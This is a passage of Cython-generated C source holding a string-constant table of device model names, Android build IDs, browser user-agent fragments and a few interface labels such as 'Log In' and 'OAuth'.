    {&__pyx_kp_s_Hongmi_Note_1TD, __pyx_k_Hongmi_Note_1TD, sizeof(__pyx_k_Hongmi_Note_1TD), 0, 0, 1, 0},
    {&__pyx_n_s_IML74K, __pyx_k_IML74K, sizeof(__pyx_k_IML74K), 0, 0, 1, 1},
    {&__pyx_n_s_IMM76D, __pyx_k_IMM76D, sizeof(__pyx_k_IMM76D), 0, 0, 1, 1},
    {&__pyx_kp_s_Installing_missing_modules, __pyx_k_Installing_missing_modules, sizeof(__pyx_k_Installing_missing_modules), 0, 0, 1, 0},
    {&__pyx_n_s_JDQ, __pyx_k_JDQ, sizeof(__pyx_k_JDQ), 0, 0, 1, 1},
    {&__pyx_n_s_JDQ39, __pyx_k_JDQ39, sizeof(__pyx_k_JDQ39), 0, 0, 1, 1},
    {&__pyx_n_s_JSS15J, __pyx_k_JSS15J, sizeof(__pyx_k_JSS15J), 0, 0, 1, 1},
    {&__pyx_n_s_JWR66L, __pyx_k_JWR66L, sizeof(__pyx_k_JWR66L), 0, 0, 1, 1},
    {&__pyx_n_s_JZO54K, __pyx_k_JZO54K, sizeof(__pyx_k_JZO54K), 0, 0, 1, 1},
    {&__pyx_n_s_January, __pyx_k_January, sizeof(__pyx_k_January), 0, 0, 1, 1},
    {&__pyx_n_s_July, __pyx_k_July, sizeof(__pyx_k_July), 0, 0, 1, 1},
    {&__pyx_n_s_June, __pyx_k_June, sizeof(__pyx_k_June), 0, 0, 1, 1},
    {&__pyx_kp_u_KHTML_like_Gecko_Chrome, __pyx_k_KHTML_like_Gecko_Chrome, sizeof(__pyx_k_KHTML_like_Gecko_Chrome), 0, 1, 0, 0},
    {&__pyx_kp_u_KHTML_like_Gecko_UCBrowser_79_0, __pyx_k_KHTML_like_Gecko_UCBrowser_79_0, sizeof(__pyx_k_KHTML_like_Gecko_UCBrowser_79_0), 0, 1, 0, 0},
    {&__pyx_kp_u_KHTML_like_Gecko_Version, __pyx_k_KHTML_like_Gecko_Version, sizeof(__pyx_k_KHTML_like_Gecko_Version), 0, 1, 0, 0},
    {&__pyx_n_s_KOT4, __pyx_k_KOT4, sizeof(__pyx_k_KOT4), 0, 0, 1, 1},
    {&__pyx_n_s_KOT49H, __pyx_k_KOT49H, sizeof(__pyx_k_KOT49H), 0, 0, 1, 1},
    {&__pyx_n_s_KTU84P, __pyx_k_KTU84P, sizeof(__pyx_k_KTU84P), 0, 0, 1, 1},
    {&__pyx_n_s_LMY4, __pyx_k_LMY4, sizeof(__pyx_k_LMY4), 0, 0, 1, 1},
    {&__pyx_n_s_LMY47V, __pyx_k_LMY47V, sizeof(__pyx_k_LMY47V), 0, 0, 1, 1},
    {&__pyx_n_s_LMY48G, __pyx_k_LMY48G, sizeof(__pyx_k_LMY48G), 0, 0, 1, 1},
    {&__pyx_n_s_LMY48J, __pyx_k_LMY48J, sizeof(__pyx_k_LMY48J), 0, 0, 1, 1},
    {&__pyx_n_s_LRX22C, __pyx_k_LRX22C, sizeof(__pyx_k_LRX22C), 0, 0, 1, 1},
    {&__pyx_n_s_LRX22G, __pyx_k_LRX22G, sizeof(__pyx_k_LRX22G), 0, 0, 1, 1},
    {&__pyx_kp_s_LRX22G_2, __pyx_k_LRX22G_2, sizeof(__pyx_k_LRX22G_2), 0, 0, 1, 0},
    {&__pyx_n_s_Last, __pyx_k_Last, sizeof(__pyx_k_Last), 0, 0, 1, 1},
    {&__pyx_n_s_Liger, __pyx_k_Liger, sizeof(__pyx_k_Liger), 0, 0, 1, 1},
    {&__pyx_kp_s_Log_In, __pyx_k_Log_In, sizeof(__pyx_k_Log_In), 0, 0, 1, 0},
    {&__pyx_n_s_M, __pyx_k_M, sizeof(__pyx_k_M), 0, 0, 1, 1},
    {&__pyx_n_u_M, __pyx_k_M, sizeof(__pyx_k_M), 0, 1, 0, 1},
    {&__pyx_n_s_M1, __pyx_k_M1, sizeof(__pyx_k_M1), 0, 0, 1, 1},
    {&__pyx_kp_u_M1_38_5_244m_38_5_244m, __pyx_k_M1_38_5_244m_38_5_244m, sizeof(__pyx_k_M1_38_5_244m_38_5_244m), 0, 1, 0, 0},
    {&__pyx_kp_u_M2_38_5_244m, __pyx_k_M2_38_5_244m, sizeof(__pyx_k_M2_38_5_244m), 0, 1, 0, 0},
    {&__pyx_n_s_M3, __pyx_k_M3, sizeof(__pyx_k_M3), 0, 0, 1, 1},
    {&__pyx_n_s_M3s, __pyx_k_M3s, sizeof(__pyx_k_M3s), 0, 0, 1, 1},
    {&__pyx_kp_s_M5_Lite, __pyx_k_M5_Lite, sizeof(__pyx_k_M5_Lite), 0, 0, 1, 0},
    {&__pyx_kp_s_M6_Note, __pyx_k_M6_Note, sizeof(__pyx_k_M6_Note), 0, 0, 1, 0},
    {&__pyx_n_s_MB526, __pyx_k_MB526, sizeof(__pyx_k_MB526), 0, 0, 1, 1},
    {&__pyx_n_s_MDB08M, __pyx_k_MDB08M, sizeof(__pyx_k_MDB08M), 0, 0, 1, 1},
    {&__pyx_kp_s_MI_2, __pyx_k_MI_2, sizeof(__pyx_k_MI_2), 0, 0, 1, 0},
    {&__pyx_kp_s_MI_3W, __pyx_k_MI_3W, sizeof(__pyx_k_MI_3W), 0, 0, 1, 0},
    {&__pyx_kp_s_MI_4i, __pyx_k_MI_4i, sizeof(__pyx_k_MI_4i), 0, 0, 1, 0},
    {&__pyx_kp_s_MI_5, __pyx_k_MI_5, sizeof(__pyx_k_MI_5), 0, 0, 1, 0},
    {&__pyx_kp_s_MI_5X, __pyx_k_MI_5X, sizeof(__pyx_k_MI_5X), 0, 0, 1, 0},
    {&__pyx_n_s_MMB29K, __pyx_k_MMB29K, sizeof(__pyx_k_MMB29K), 0, 0, 1, 1},
    {&__pyx_n_s_MMB29M, __pyx_k_MMB29M, sizeof(__pyx_k_MMB29M), 0, 0, 1, 1},
    {&__pyx_n_s_MMB29U, __pyx_k_MMB29U, sizeof(__pyx_k_MMB29U), 0, 0, 1, 1},
    {&__pyx_kp_s_MT6765_G_Series, __pyx_k_MT6765_G_Series, sizeof(__pyx_k_MT6765_G_Series), 0, 0, 1, 0},
    {&__pyx_n_s_MX2, __pyx_k_MX2, sizeof(__pyx_k_MX2), 0, 0, 1, 1},
    {&__pyx_n_s_MX380, __pyx_k_MX380, sizeof(__pyx_k_MX380), 0, 0, 1, 1},
    {&__pyx_n_s_MX5, __pyx_k_MX5, sizeof(__pyx_k_MX5), 0, 0, 1, 1},
    {&__pyx_kp_s_M_Bot_54, __pyx_k_M_Bot_54, sizeof(__pyx_k_M_Bot_54), 0, 0, 1, 0},
    {&__pyx_kp_s_M_Bot_60, __pyx_k_M_Bot_60, sizeof(__pyx_k_M_Bot_60), 0, 0, 1, 0},
    {&__pyx_n_s_Magic, __pyx_k_Magic, sizeof(__pyx_k_Magic), 0, 0, 1, 1},
    {&__pyx_kp_s_Maimang_5, __pyx_k_Maimang_5, sizeof(__pyx_k_Maimang_5), 0, 0, 1, 0},
    {&__pyx_n_s_March, __pyx_k_March, sizeof(__pyx_k_March), 0, 0, 1, 1},
    {&__pyx_kp_s_Mate_10_Lite_Dual_SIM, __pyx_k_Mate_10_Lite_Dual_SIM, sizeof(__pyx_k_Mate_10_Lite_Dual_SIM), 0, 0, 1, 0},
    {&__pyx_kp_s_Mate_20_X_China, __pyx_k_Mate_20_X_China, sizeof(__pyx_k_Mate_20_X_China), 0, 0, 1, 0},
    {&__pyx_kp_s_Mate_8, __pyx_k_Mate_8, sizeof(__pyx_k_Mate_8), 0, 0, 1, 0},
    {&__pyx_n_s_May, __pyx_k_May, sizeof(__pyx_k_May), 0, 0, 1, 1},
    {&__pyx_kp_s_Medias_X, __pyx_k_Medias_X, sizeof(__pyx_k_Medias_X), 0, 0, 1, 0},
    {&__pyx_n_s_Mi5, __pyx_k_Mi5, sizeof(__pyx_k_Mi5), 0, 0, 1, 1},
    {&__pyx_kp_s_MiTV_4A, __pyx_k_MiTV_4A, sizeof(__pyx_k_MiTV_4A), 0, 0, 1, 0},
    {&__pyx_kp_s_MiTV_4A_Pro, __pyx_k_MiTV_4A_Pro, sizeof(__pyx_k_MiTV_4A_Pro), 0, 0, 1, 0},
    {&__pyx_kp_s_MiTV_4C, __pyx_k_MiTV_4C, sizeof(__pyx_k_MiTV_4C), 0, 0, 1, 0},
    {&__pyx_kp_s_MiTV_4I, __pyx_k_MiTV_4I, sizeof(__pyx_k_MiTV_4I), 0, 0, 1, 0},
    {&__pyx_kp_s_MiTV_4S, __pyx_k_MiTV_4S, sizeof(__pyx_k_MiTV_4S), 0, 0, 1, 0},
    {&__pyx_kp_s_MiTV_4X, __pyx_k_MiTV_4X, sizeof(__pyx_k_MiTV_4X), 0, 0, 1, 0},
    {&__pyx_kp_s_MiTV_P1, __pyx_k_MiTV_P1, sizeof(__pyx_k_MiTV_P1), 0, 0, 1, 0},
    {&__pyx_kp_s_MiTV_Q1, __pyx_k_MiTV_Q1, sizeof(__pyx_k_MiTV_Q1), 0, 0, 1, 0},
    {&__pyx_kp_s_MiTV_Stick, __pyx_k_MiTV_Stick, sizeof(__pyx_k_MiTV_Stick), 0, 0, 1, 0},
    {&__pyx_kp_s_MiTV_Stick_4K, __pyx_k_MiTV_Stick_4K, sizeof(__pyx_k_MiTV_Stick_4K), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_4_LTE, __pyx_k_Mi_4_LTE, sizeof(__pyx_k_Mi_4_LTE), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_A1, __pyx_k_Mi_A1, sizeof(__pyx_k_Mi_A1), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Box_4, __pyx_k_Mi_Box_4, sizeof(__pyx_k_Mi_Box_4), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_CC9, __pyx_k_Mi_CC9, sizeof(__pyx_k_Mi_CC9), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_CC_9, __pyx_k_Mi_CC_9, sizeof(__pyx_k_Mi_CC_9), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_CC_9_Pro, __pyx_k_Mi_CC_9_Pro, sizeof(__pyx_k_Mi_CC_9_Pro), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_CC_9e, __pyx_k_Mi_CC_9e, sizeof(__pyx_k_Mi_CC_9e), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Cancro, __pyx_k_Mi_Cancro, sizeof(__pyx_k_Mi_Cancro), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Laser_Projector_150, __pyx_k_Mi_Laser_Projector_150, sizeof(__pyx_k_Mi_Laser_Projector_150), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_MAX2, __pyx_k_Mi_MAX2, sizeof(__pyx_k_Mi_MAX2), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Max, __pyx_k_Mi_Max, sizeof(__pyx_k_Mi_Max), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Max3, __pyx_k_Mi_Max3, sizeof(__pyx_k_Mi_Max3), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Max_2, __pyx_k_Mi_Max_2, sizeof(__pyx_k_Mi_Max_2), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Max_3, __pyx_k_Mi_Max_3, sizeof(__pyx_k_Mi_Max_3), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Mix, __pyx_k_Mi_Mix, sizeof(__pyx_k_Mi_Mix), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Mix_2, __pyx_k_Mi_Mix_2, sizeof(__pyx_k_Mi_Mix_2), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Mix_2S, __pyx_k_Mi_Mix_2S, sizeof(__pyx_k_Mi_Mix_2S), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Mix_3, __pyx_k_Mi_Mix_3, sizeof(__pyx_k_Mi_Mix_3), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Mix_3_5G, __pyx_k_Mi_Mix_3_5G, sizeof(__pyx_k_Mi_Mix_3_5G), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Mix_4, __pyx_k_Mi_Mix_4, sizeof(__pyx_k_Mi_Mix_4), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Mix_Fold, __pyx_k_Mi_Mix_Fold, sizeof(__pyx_k_Mi_Mix_Fold), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Note10, __pyx_k_Mi_Note10, sizeof(__pyx_k_Mi_Note10), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Note5, __pyx_k_Mi_Note5, sizeof(__pyx_k_Mi_Note5), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Note_10, __pyx_k_Mi_Note_10, sizeof(__pyx_k_Mi_Note_10), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Note_10_Lite, __pyx_k_Mi_Note_10_Lite, sizeof(__pyx_k_Mi_Note_10_Lite), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Note_10_Pro, __pyx_k_Mi_Note_10_Pro, sizeof(__pyx_k_Mi_Note_10_Pro), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Note_11, __pyx_k_Mi_Note_11, sizeof(__pyx_k_Mi_Note_11), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Note_2, __pyx_k_Mi_Note_2, sizeof(__pyx_k_Mi_Note_2), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Note_3, __pyx_k_Mi_Note_3, sizeof(__pyx_k_Mi_Note_3), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Note_8, __pyx_k_Mi_Note_8, sizeof(__pyx_k_Mi_Note_8), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Note_LTE, __pyx_k_Mi_Note_LTE, sizeof(__pyx_k_Mi_Note_LTE), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Note_Pro, __pyx_k_Mi_Note_Pro, sizeof(__pyx_k_Mi_Note_Pro), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_One, __pyx_k_Mi_One, sizeof(__pyx_k_Mi_One), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_One_C1, __pyx_k_Mi_One_C1, sizeof(__pyx_k_Mi_One_C1), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_One_Plus, __pyx_k_Mi_One_Plus, sizeof(__pyx_k_Mi_One_Plus), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Pad, __pyx_k_Mi_Pad, sizeof(__pyx_k_Mi_Pad), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Pad4, __pyx_k_Mi_Pad4, sizeof(__pyx_k_Mi_Pad4), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Pad5, __pyx_k_Mi_Pad5, sizeof(__pyx_k_Mi_Pad5), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Pad_2, __pyx_k_Mi_Pad_2, sizeof(__pyx_k_Mi_Pad_2), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Pad_3, __pyx_k_Mi_Pad_3, sizeof(__pyx_k_Mi_Pad_3), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Pad_4, __pyx_k_Mi_Pad_4, sizeof(__pyx_k_Mi_Pad_4), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Pad_4_Plus, __pyx_k_Mi_Pad_4_Plus, sizeof(__pyx_k_Mi_Pad_4_Plus), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Pad_5, __pyx_k_Mi_Pad_5, sizeof(__pyx_k_Mi_Pad_5), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Pad_5_Pro, __pyx_k_Mi_Pad_5_Pro, sizeof(__pyx_k_Mi_Pad_5_Pro), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Pad_5_Pro_5G, __pyx_k_Mi_Pad_5_Pro_5G, sizeof(__pyx_k_Mi_Pad_5_Pro_5G), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_Play, __pyx_k_Mi_Play, sizeof(__pyx_k_Mi_Play), 0, 0, 1, 0},
    {&__pyx_kp_s_Mi_XL, __pyx_k_Mi_XL, sizeof(__pyx_k_Mi_XL), 0, 0, 1, 0},
    {&__pyx_n_s_Milestone, __pyx_k_Milestone, sizeof(__pyx_k_Milestone), 0, 0, 1, 1},
    {&__pyx_n_s_Miracle, __pyx_k_Miracle, sizeof(__pyx_k_Miracle), 0, 0, 1, 1},
    {&__pyx_kp_s_Mix_Fold_2, __pyx_k_Mix_Fold_2, sizeof(__pyx_k_Mix_Fold_2), 0, 0, 1, 0},
    {&__pyx_kp_u_Mobile_Safari, __pyx_k_Mobile_Safari, sizeof(__pyx_k_Mobile_Safari), 0, 1, 0, 0},
    {&__pyx_kp_u_Mobile_Safari_537_36_XiaoMi_Miu, __pyx_k_Mobile_Safari_537_36_XiaoMi_Miu, sizeof(__pyx_k_Mobile_Safari_537_36_XiaoMi_Miu), 0, 1, 0, 0},
    {&__pyx_n_s_ModuleNotFoundError, __pyx_k_ModuleNotFoundError, sizeof(__pyx_k_ModuleNotFoundError), 0, 0, 1, 1},
    {&__pyx_kp_s_Moment_Sprint, __pyx_k_Moment_Sprint, sizeof(__pyx_k_Moment_Sprint), 0, 0, 1, 0},
    {&__pyx_n_s_Monza, __pyx_k_Monza, sizeof(__pyx_k_Monza), 0, 0, 1, 1},
    {&__pyx_kp_s_Motion_Plus, __pyx_k_Motion_Plus, sizeof(__pyx_k_Motion_Plus), 0, 0, 1, 0},
    {&__pyx_kp_s_Moto_C, __pyx_k_Moto_C, sizeof(__pyx_k_Moto_C), 0, 0, 1, 0},
    {&__pyx_kp_s_Moto_E2_4G_LTE, __pyx_k_Moto_E2_4G_LTE, sizeof(__pyx_k_Moto_E2_4G_LTE), 0, 0, 1, 0},
    {&__pyx_kp_s_Moto_E3_Power, __pyx_k_Moto_E3_Power, sizeof(__pyx_k_Moto_E3_Power), 0, 0, 1, 0},
    {&__pyx_kp_s_Moto_E4, __pyx_k_Moto_E4, sizeof(__pyx_k_Moto_E4), 0, 0, 1, 0},
    {&__pyx_kp_s_Moto_E4_Plus, __pyx_k_Moto_E4_Plus, sizeof(__pyx_k_Moto_E4_Plus), 0, 0, 1, 0},
    {&__pyx_kp_s_Moto_E5, __pyx_k_Moto_E5, sizeof(__pyx_k_Moto_E5), 0, 0, 1, 0},
    {&__pyx_kp_s_Moto_E5_Plus, __pyx_k_Moto_E5_Plus, sizeof(__pyx_k_Moto_E5_Plus), 0, 0, 1, 0},
    {&__pyx_kp_s_Moto_G, __pyx_k_Moto_G, sizeof(__pyx_k_Moto_G), 0, 0, 1, 0},
    {&__pyx_kp_s_Moto_G3, __pyx_k_Moto_G3, sizeof(__pyx_k_Moto_G3), 0, 0, 1, 0},
    {&__pyx_kp_s_Moto_G3_Turbo_Edition, __pyx_k_Moto_G3_Turbo_Edition, sizeof(__pyx_k_Moto_G3_Turbo_Edition), 0, 0, 1, 0},
    {&__pyx_kp_s_Moto_G4, __pyx_k_Moto_G4, sizeof(__pyx_k_Moto_G4), 0, 0, 1, 0},
    {&__pyx_kp_s_Moto_G5_Plus, __pyx_k_Moto_G5_Plus, sizeof(__pyx_k_Moto_G5_Plus), 0, 0, 1, 0},
    {&__pyx_kp_s_Moto_G5s, __pyx_k_Moto_G5s, sizeof(__pyx_k_Moto_G5s), 0, 0, 1, 0},
    {&__pyx_kp_s_Moto_G5s_Plus, __pyx_k_Moto_G5s_Plus, sizeof(__pyx_k_Moto_G5s_Plus), 0, 0, 1, 0},
    {&__pyx_kp_s_Moto_G6, __pyx_k_Moto_G6, sizeof(__pyx_k_Moto_G6), 0, 0, 1, 0},
    {&__pyx_kp_s_Moto_G_2nd_Gen, __pyx_k_Moto_G_2nd_Gen, sizeof(__pyx_k_Moto_G_2nd_Gen), 0, 0, 1, 0},
    {&__pyx_kp_s_Moto_G_Play, __pyx_k_Moto_G_Play, sizeof(__pyx_k_Moto_G_Play), 0, 0, 1, 0},
    {&__pyx_kp_s_Moto_X, __pyx_k_Moto_X, sizeof(__pyx_k_Moto_X), 0, 0, 1, 0},
    {&__pyx_kp_s_Moto_X_2nd_Gen_AT_T, __pyx_k_Moto_X_2nd_Gen_AT_T, sizeof(__pyx_k_Moto_X_2nd_Gen_AT_T), 0, 0, 1, 0},
    {&__pyx_kp_s_Moto_Z, __pyx_k_Moto_Z, sizeof(__pyx_k_Moto_Z), 0, 0, 1, 0},
    {&__pyx_kp_u_Mozilla_5_0_Linux_Android, __pyx_k_Mozilla_5_0_Linux_Android, sizeof(__pyx_k_Mozilla_5_0_Linux_Android), 0, 1, 0, 0},
    {&__pyx_kp_u_Mozilla_5_0_Linux_U_Android_10_e, __pyx_k_Mozilla_5_0_Linux_U_Android_10_e, sizeof(__pyx_k_Mozilla_5_0_Linux_U_Android_10_e), 0, 1, 0, 0},
    {&__pyx_kp_u_Mozilla_5_0_Linux_U_Android_13_p, __pyx_k_Mozilla_5_0_Linux_U_Android_13_p, sizeof(__pyx_k_Mozilla_5_0_Linux_U_Android_13_p), 0, 1, 0, 0},
    {&__pyx_kp_u_Mozilla_5_0_Linux_arm_64_Android, __pyx_k_Mozilla_5_0_Linux_arm_64_Android, sizeof(__pyx_k_Mozilla_5_0_Linux_arm_64_Android), 0, 1, 0, 0},
    {&__pyx_kp_u_Mozilla_5_0_Macintosh_Intel_Mac, __pyx_k_Mozilla_5_0_Macintosh_Intel_Mac, sizeof(__pyx_k_Mozilla_5_0_Macintosh_Intel_Mac), 0, 1, 0, 0},
    {&__pyx_kp_u_Mozilla_5_0_Windows_NT, __pyx_k_Mozilla_5_0_Windows_NT, sizeof(__pyx_k_Mozilla_5_0_Windows_NT), 0, 1, 0, 0},
    {&__pyx_kp_u_Mozilla_5_0_Windows_NT_10_0_Win6, __pyx_k_Mozilla_5_0_Windows_NT_10_0_Win6, sizeof(__pyx_k_Mozilla_5_0_Windows_NT_10_0_Win6), 0, 1, 0, 0},
    {&__pyx_kp_u_Mozilla_5_0_Windows_NT_6, __pyx_k_Mozilla_5_0_Windows_NT_6, sizeof(__pyx_k_Mozilla_5_0_Windows_NT_6), 0, 1, 0, 0},
    {&__pyx_kp_u_Mozilla_5_0_Windows_U_Windows_NT, __pyx_k_Mozilla_5_0_Windows_U_Windows_NT, sizeof(__pyx_k_Mozilla_5_0_Windows_U_Windows_NT), 0, 1, 0, 0},
    {&__pyx_kp_u_Mozilla_5_0_X11_Linux_x86_64_And, __pyx_k_Mozilla_5_0_X11_Linux_x86_64_And, sizeof(__pyx_k_Mozilla_5_0_X11_Linux_x86_64_And), 0, 1, 0, 0},
    {&__pyx_kp_s_MultiPhone_3350_Duo, __pyx_k_MultiPhone_3350_Duo, sizeof(__pyx_k_MultiPhone_3350_Duo), 0, 0, 1, 0},
    {&__pyx_kp_s_MultiPhone_4044_Duo, __pyx_k_MultiPhone_4044_Duo, sizeof(__pyx_k_MultiPhone_4044_Duo), 0, 0, 1, 0},
    {&__pyx_kp_s_MultiPhone_5504_DUO, __pyx_k_MultiPhone_5504_DUO, sizeof(__pyx_k_MultiPhone_5504_DUO), 0, 0, 1, 0},
    {&__pyx_kp_s_Multipad_2_Ultra_Duo_8_0_3G, __pyx_k_Multipad_2_Ultra_Duo_8_0_3G, sizeof(__pyx_k_Multipad_2_Ultra_Duo_8_0_3G), 0, 0, 1, 0},
    {&__pyx_kp_s_Multiphone_7600_Duo, __pyx_k_Multiphone_7600_Duo, sizeof(__pyx_k_Multiphone_7600_Duo), 0, 0, 1, 0},
    {&__pyx_n_s_N4F26J, __pyx_k_N4F26J, sizeof(__pyx_k_N4F26J), 0, 0, 1, 1},
    {&__pyx_n_s_N4F26X, __pyx_k_N4F26X, sizeof(__pyx_k_N4F26X), 0, 0, 1, 1},
    {&__pyx_n_s_N970FXXS8ETK4, __pyx_k_N970FXXS8ETK4, sizeof(__pyx_k_N970FXXS8ETK4), 0, 0, 1, 1},
    {&__pyx_n_s_N986BXXU1BTJ4, __pyx_k_N986BXXU1BTJ4, sizeof(__pyx_k_N986BXXU1BTJ4), 0, 0, 1, 1},
    {&__pyx_n_s_N9F27L, __pyx_k_N9F27L, sizeof(__pyx_k_N9F27L), 0, 0, 1, 1},
    {&__pyx_n_s_ND, __pyx_k_ND, sizeof(__pyx_k_ND), 0, 0, 1, 1},
    {&__pyx_n_s_NDE63H, __pyx_k_NDE63H, sizeof(__pyx_k_NDE63H), 0, 0, 1, 1},
    {&__pyx_n_s_NMF2, __pyx_k_NMF2, sizeof(__pyx_k_NMF2), 0, 0, 1, 1},
    {&__pyx_n_s_NMF26X, __pyx_k_NMF26X, sizeof(__pyx_k_NMF26X), 0, 0, 1, 1},
    {&__pyx_kp_s_NMF26X_2, __pyx_k_NMF26X_2, sizeof(__pyx_k_NMF26X_2), 0, 0, 1, 0},
    {&__pyx_n_s_NMF27D, __pyx_k_NMF27D, sizeof(__pyx_k_NMF27D), 0, 0, 1, 1},
    {&__pyx_n_s_NRD90M, __pyx_k_NRD90M, sizeof(__pyx_k_NRD90M), 0, 0, 1, 1},
    {&__pyx_kp_s_NRD90M_2, __pyx_k_NRD90M_2, sizeof(__pyx_k_NRD90M_2), 0, 0, 1, 0},
    {&__pyx_n_s_Name, __pyx_k_Name, sizeof(__pyx_k_Name), 0, 0, 1, 1},
    {&__pyx_n_u_NokiaX, __pyx_k_NokiaX, sizeof(__pyx_k_NokiaX), 0, 1, 0, 1},
    {&__pyx_kp_s_Not_A_Brand_v_8_0_0_0_Chromium, __pyx_k_Not_A_Brand_v_8_0_0_0_Chromium, sizeof(__pyx_k_Not_A_Brand_v_8_0_0_0_Chromium), 0, 0, 1, 0},
    {&__pyx_kp_s_Not_A_Brand_v_8_Chromium_v_120, __pyx_k_Not_A_Brand_v_8_Chromium_v_120, sizeof(__pyx_k_Not_A_Brand_v_8_Chromium_v_120), 0, 0, 1, 0},
    {&__pyx_kp_s_Note_12_Pro, __pyx_k_Note_12_Pro, sizeof(__pyx_k_Note_12_Pro), 0, 0, 1, 0},
    {&__pyx_n_s_November, __pyx_k_November, sizeof(__pyx_k_November), 0, 0, 1, 1},
    {&__pyx_kp_u_OAuth, __pyx_k_OAuth, sizeof(__pyx_k_OAuth), 0, 1, 0, 0},
    {&__pyx_kp_s_OPM2_171026_006_C1, __pyx_k_OPM2_171026_006_C1, sizeof(__pyx_k_OPM2_171026_006_C1), 0, 0, 1, 0},
    {&__pyx_kp_s_OPM6_171019_030_K1, __pyx_k_OPM6_171019_030_K1, sizeof(__pyx_k_OPM6_171019_030_K1), 0, 0, 1, 0},
    {&__pyx_kp_s_OT_7025D, __pyx_k_OT_7025D, sizeof(__pyx_k_OT_7025D), 0, 0, 1, 0},
    {&__pyx_n_s_OUT, __pyx_k_OUT, sizeof(__pyx_k_OUT), 0, 0, 1, 1},
    {&__pyx_n_s_October, __pyx_k_October, sizeof(__pyx_k_October), 0, 0, 1, 1},
    {&__pyx_kp_s_Optimus_Vu, __pyx_k_Optimus_Vu, sizeof(__pyx_k_Optimus_Vu), 0, 0, 1, 0},
    {&__pyx_kp_s_P10_Lite_LTE, __pyx_k_P10_Lite_LTE, sizeof(__pyx_k_P10_Lite_LTE), 0, 0, 1, 0},
    {&__pyx_n_s_P2, __pyx_k_P2, sizeof(__pyx_k_P2), 0, 0, 1, 1},
    {&__pyx_kp_s_P20_Lite, __pyx_k_P20_Lite, sizeof(__pyx_k_P20_Lite), 0, 0, 1, 0},
    {&__pyx_kp_s_P30_Pro_Global, __pyx_k_P30_Pro_Global, sizeof(__pyx_k_P30_Pro_Global), 0, 0, 1, 0},
    {&__pyx_n_s_P3400, __pyx_k_P3400, sizeof(__pyx_k_P3400), 0, 0, 1, 1},
    {&__pyx_kp_s_P55_Max, __pyx_k_P55_Max, sizeof(__pyx_k_P55_Max), 0, 0, 1, 0},
    {&__pyx_kp_s_P7_Max, __pyx_k_P7_Max, sizeof(__pyx_k_P7_Max), 0, 0, 1, 0},
    {&__pyx_kp_s_P8_Lite, __pyx_k_P8_Lite, sizeof(__pyx_k_P8_Lite), 0, 0, 1, 0},
    {&__pyx_kp_s_P9_Lite, __pyx_k_P9_Lite, sizeof(__pyx_k_P9_Lite), 0, 0, 1, 0},
    {&__pyx_n_s_PM, __pyx_k_PM, sizeof(__pyx_k_PM), 0, 0, 1, 1},
    {&__pyx_kp_s_PPR1_180610_011, __pyx_k_PPR1_180610_011, sizeof(__pyx_k_PPR1_180610_011), 0, 0, 1, 0},
    {&__pyx_kp_s_PPR2_180905_006, __pyx_k_PPR2_180905_006, sizeof(__pyx_k_PPR2_180905_006), 0, 0, 1, 0},
    {&__pyx_kp_s_PQ1A_181205_002_A1, __pyx_k_PQ1A_181205_002_A1, sizeof(__pyx_k_PQ1A_181205_002_A1), 0, 0, 1, 0},
    {&__pyx_kp_s_PQ1A_181205_006, __pyx_k_PQ1A_181205_006, sizeof(__pyx_k_PQ1A_181205_006), 0, 0, 1, 0},
    {&__pyx_kp_s_PQ3B_190801_002, __pyx_k_PQ3B_190801_002, sizeof(__pyx_k_PQ3B_190801_002), 0, 0, 1, 0},
    {&__pyx_kp_s_Pacific_800i, __pyx_k_Pacific_800i, sizeof(__pyx_k_Pacific_800i), 0, 0, 1, 0},
    {&__pyx_kp_s_Pad_6_Pro, __pyx_k_Pad_6_Pro, sizeof(__pyx_k_Pad_6_Pro), 0, 0, 1, 0},
    {&__pyx_kp_s_Pearl_8100, __pyx_k_Pearl_8100, sizeof(__pyx_k_Pearl_8100), 0, 0, 1, 0},
    {&__pyx_kp_s_Phoenix_2, __pyx_k_Phoenix_2, sizeof(__pyx_k_Phoenix_2), 0, 0, 1, 0},
